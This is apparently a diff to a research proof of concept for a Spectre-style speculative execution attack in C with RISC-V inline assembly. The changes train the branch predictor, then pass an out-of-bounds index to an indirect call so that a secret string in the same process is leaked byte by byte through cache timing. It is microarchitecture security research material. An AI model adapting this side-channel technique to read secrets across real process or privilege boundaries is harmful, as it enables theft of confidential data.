@@ -44,6 +44,10 @@ void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, ui
     }
 }
 
+/**
+ * on the victim run this should be the function that should run. what should happen is that during the attack run
+ * the victimFunc should run speculatively (it is the gadget) then the wantFunc should run
+ */
 void wantFunc(){
     printf("This is what should run!\n");
 }
@@ -62,6 +66,8 @@ int main(void){
     uint64_t wantAddr = (uint64_t)(&wantFunc); 
     uint64_t victimAddr = (uint64_t)(&victimFunc);
     uint64_t start, diff, passInAddr;
+    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
+    uint64_t passInIdx, randIdx;
     uint8_t dummy = 0;
     static uint64_t results[256];
     //printf("Array1 at (0x%p), Secret at (0x%p), Subtraction (%d)\n", array1, secretString, wantAddr);
@@ -89,6 +95,12 @@ int main(void){
                 passInAddr = (passInAddr | (passInAddr >> 16)); // set the passInAddr=-1 or 0
                 passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); // select TRAIN_IDX or wantAddr 
 
+                randIdx = atkRound % array1_sz;
+                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
+                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
+                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select TRAIN_IDX or attackIdx 
+
+
                 // set of constant takens to make the BHR be in a all taken state
                 for(uint64_t k = 0; k < 30; ++k){
                     asm("");
@@ -109,7 +121,7 @@ int main(void){
                     "mv a0, %[arg]\n"
                     "jalr ra, %[addr], 0\n"
                     ://: [addr] "=r" (passInAddr)
-                    : [addr] "r" (passInAddr), [arg] "r" (len)
+                    : [addr] "r" (passInAddr), [arg] "r" (passInIdx)
                     : "t1", "t2", "fa4", "fa5");
             }
             
@@ -131,10 +143,10 @@ int main(void){
         uint64_t hitArray[2];
         topTwoIdx(results, 256, output, hitArray);
 
-        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + wantAddr), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
+        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
 
         // read in the next secret 
-        ++wantAddr;
+        ++attackIdx;
     }
 
     return 0;
